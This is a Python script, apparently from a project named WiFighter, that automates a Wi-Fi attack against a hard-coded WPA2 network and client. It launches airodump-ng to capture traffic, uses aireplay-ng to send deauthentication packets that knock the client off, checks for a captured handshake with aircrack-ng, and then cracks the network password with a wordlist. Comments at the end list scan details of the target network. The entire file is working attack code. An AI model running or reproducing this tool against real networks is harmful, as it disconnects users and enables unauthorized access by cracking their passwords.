#!venv/bin/python

import os, subprocess, time
import multiprocessing


interface = "wlp1s0"

ssid = "Struhar_2.4GHz"
bssid = "40:ed:00:17:e0:d8"
channel = "6"

client_mac = "02:26:02:03:25:e0"
deauth_type = "client"

output_dir = f"/home/filip/Coding/WiFighter/attacks/{ssid}"


def list_files(directory): 
    return set(os.listdir(directory))

def cap_file(files_before, files_after):
    new_files = files_after - files_before

    for filename in new_files:
        if '.cap' in filename:
            return filename  


# Run airodump-ng
def run_airodump(interface, bssid, channel, output_dir):
    if interface and bssid and channel and output_dir:
        #os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_dir} {interface} > /dev/null 2>&1")
        command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/handshake', interface]
        subprocess.Popen(command, text=True)

# Run aireplay-ng
def run_aireplay(interface, bssid, client_mac, deauth_type):
    if interface and bssid and client_mac and deauth_type:
        if deauth_type == "client":
            if client_mac:
                #os.popen(f"sudo aireplay-ng -0 1 -a {bssid} -c {client_mac} {interface}")
                command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface]
                subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif deauth_type == "broadcast":
            #os.popen(f"sudo aireplay-ng -0 1 -a {bssid} {interface}")
            command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
            subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


# Define processes
capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_dir))
deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, client_mac, deauth_type))

files_before = list_files(output_dir) # Get files before airodump-ng adds new

# Listen for handshake
capture_handshake.start() # Start airodump-ng process
time.sleep(2)

# Deauth client/s
deauth_client.start() # Start aireplay-ng process
deauth_client.join() # Wait for the process to stop
print(f"[1] Deauth packet send to client {client_mac}")

files_after = list_files(output_dir) # Get files after airodump-ng adds new

output_file = cap_file(files_before, files_after) # Determine output_file in which airodump-ng stores

# Wait and verify that handshake was captured successfuly
captured = False
print('[2] Waiting for handshake...')
print(f'(saving capture to WiFighter/attacks/*SSID*/{output_file})')
while not captured:
    if os.path.exists(f"{output_dir}/{output_file}"):
        #verify = os.popen(f"sudo aircrack-ng {output_file}-01.cap").read()
        command = ['sudo', 'aircrack-ng', f'{output_dir}/{output_file}']
        verify = subprocess.Popen(command, stdout=subprocess.PIPE, text=True)
        output = str(verify.communicate())
        if "(0 handshake)" not in output and "Unknown" not in output:
            print("[3] Handshake/s captured!")
            captured = True
    time.sleep(1)

capture_handshake.kill() # Stop airodump-ng process
capture_handshake.join() # Wait for the process to stop

os.system(f"sudo aircrack-ng -w wordlist.txt {output_dir}/{output_file}") # Crack password




#  {'SSID': 'Struhar 2.4GHz', 'BSSID': '40:ed:00:17:e0:d8', 'Channel': '6', 'Signal': '-47', 'Band': '2.4 GHz', 'Encryption': 'WPA2', 'Auth': 'PSK', 'Cipher': 'CCMP'}

#  2C:BE:EB:80:DE:7A
#  -81203666-
